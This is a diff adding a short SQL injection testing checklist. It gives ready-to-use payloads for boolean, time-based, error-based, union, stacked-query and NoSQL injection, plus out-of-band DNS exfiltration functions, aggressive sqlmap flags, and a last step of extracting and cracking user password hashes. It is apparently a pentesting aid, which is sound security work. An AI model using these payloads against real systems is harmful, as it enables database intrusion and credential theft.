@@ -1,0 +1,17 @@
+# Checklist: SQLi
+- [ ] Test every parameter that lands in SQL (id, search, sort, filter)
+- [ ] Inject `'`, `"`, `\`, `';`, `'/*` → look for SQL errors / 500
+- [ ] Boolean diff: `' AND '1'='1` vs `' AND '1'='2`
+- [ ] Time-based: `' OR pg_sleep(5)-- -`, `' AND IF(1=1,SLEEP(5),0)-- -`
+- [ ] Error-based: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
+- [ ] Union-based: find # columns via ORDER BY, then UNION SELECT NULL...
+- [ ] Stacked queries: `; SELECT pg_sleep(5)-- -` (Postgres / MSSQL)
+- [ ] Out-of-band: DNS exfil via `xp_dirtree` (MSSQL), `LOAD_FILE` (MySQL)
+- [ ] Headers (X-Forwarded-For, User-Agent, Referer, Cookie)
+- [ ] JSON body fields (incl. nested)
+- [ ] GraphQL string args
+- [ ] NoSQL: `{"$ne":null}`, `{"$gt":""}`, `{"$where":"..."}`
+- [ ] Run sqlmap with full args (`--level=3 --risk=2 --random-agent --batch --tamper=...`)
+- [ ] If second-order — test where input is later used (admin search, audit log)
+- [ ] Confirm exploitability: read DB version, current_user, schema
+- [ ] Show full impact (extract user/password hash, then attempt crack offline)
